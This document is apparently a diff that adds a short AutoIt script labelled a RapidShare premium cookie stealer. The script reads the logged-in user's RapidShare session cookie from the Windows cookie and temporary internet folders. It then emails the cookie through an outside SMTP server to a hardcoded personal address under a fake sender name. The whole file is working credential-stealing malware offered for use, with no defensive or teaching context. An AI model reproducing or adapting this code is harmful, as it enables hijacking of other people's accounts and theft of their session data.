@@ -1,0 +1,25 @@
+#include <Inet.au3>
+
+;RAPIDSHARE.COM PREMIUM COOKIE STEALER
+
+_StealPremiumCookie("mail.chello.nl", "florentg@chello.nl")
+
+Func _StealPremiumCookie($smtp, $email)
+
+$PATH = @UserProfileDir&"\Cookies"
+$PATH1 = @UserProfileDir&"\Local Settings\Temporary Internet Files"
+$COOKIENAME = @UserName&"@rapidshare[1].txt"
+
+$1 = FileReadLine($PATH&"\"&$COOKIENAME, 2)
+$2 = FileReadLine($PATH1&"\"&$COOKIENAME, 2)
+
+$s_SmtpServer = $smtp
+$s_FromName = "broodplank"
+$s_FromAddress = "1337@1337.com"
+$s_ToAddress = $email
+$s_Subject = "Premium RS Cookie!"
+Dim $as_Body[2]
+$as_Body[0] = $1
+$as_Body[1] = $2
+$Response = _INetSmtpMail ($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject, $as_Body)
+EndFunc
